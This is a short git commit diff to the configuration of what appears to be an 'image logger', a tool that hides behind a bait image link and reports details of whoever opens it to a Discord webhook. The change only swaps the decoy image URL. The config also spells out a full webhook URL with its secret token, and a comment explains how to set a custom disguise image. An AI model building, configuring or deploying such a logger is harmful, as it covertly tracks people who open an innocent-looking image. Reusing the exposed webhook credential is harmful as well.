f970168fbde76628138049f27882d5eda25f4ca0
ACE <ace769116@gmail.com>
2025-04-10 00:35:19 +0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "ACE"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1348119975251939329/vYx2IjMRhMrJGJ5IthG5LWrq4YZrgPTeLa2Y_TnmCdXZpof1zdc7Fmph5LrIG2jNuBmg",
-    "image": "  https://support.discord.com/hc/article_attachments/27098861617687.jpg", # You can also have a custom image by using a URL argument
+    "image": "  https://appuals.com/wp-content/uploads/2024/11/2024-11-19_011705-1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
